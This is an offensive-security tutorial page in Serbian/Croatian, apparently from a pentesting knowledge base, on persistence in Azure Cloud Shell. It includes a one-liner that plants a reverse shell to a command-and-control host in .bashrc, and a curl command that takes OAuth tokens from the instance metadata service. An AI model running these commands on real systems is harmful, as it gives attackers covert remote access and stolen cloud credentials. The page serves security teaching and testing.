# Az - Cloud Shell Persistence

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Shell Persistence

Azure Cloud Shell nudi pristup komandnoj liniji za upravljanje Azure resursima sa persistentnim skladištem i automatskom autentifikacijom. Napadači mogu iskoristiti ovo postavljanjem backdoora u persistentni direktorijum:

* **Persistent Storage**: Početni direktorijum Azure Cloud Shell-a je montiran na Azure deljenje datoteka i ostaje netaknut čak i nakon završetka sesije.
* **Startup Scripts**: Datoteke poput .bashrc se automatski izvršavaju na početku svake sesije, omogućavajući persistentno izvršavanje kada se cloud shell pokrene.

Primer backdoora u .bashrc:
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/$CCSERVER/443 0>&1 &)' >> $HOME/.bashrc
```
Ova backdoor može izvršavati komande čak i 5 minuta nakon što korisnik završi sa cloud shell-om.

Dodatno, upitite Azure-ovu metadata uslugu za detalje instance i tokene:
```bash
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -s
```
{{#include ../../../banners/hacktricks-training.md}}
